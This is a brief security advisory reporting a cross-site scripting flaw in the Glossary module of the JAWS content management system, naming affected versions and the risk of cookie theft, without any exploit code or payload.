JAWS is prone to a cross-site scripting vulnerability.

This issue is due to a failure in the application to properly sanitize user-supplied input to the 'Glossary' module.

This may facilitate the theft of cookie-based authentication credentials as well as other attacks.

JAWS versions 0.4 and 0.5 and subsequent are reportedly vulnerable.
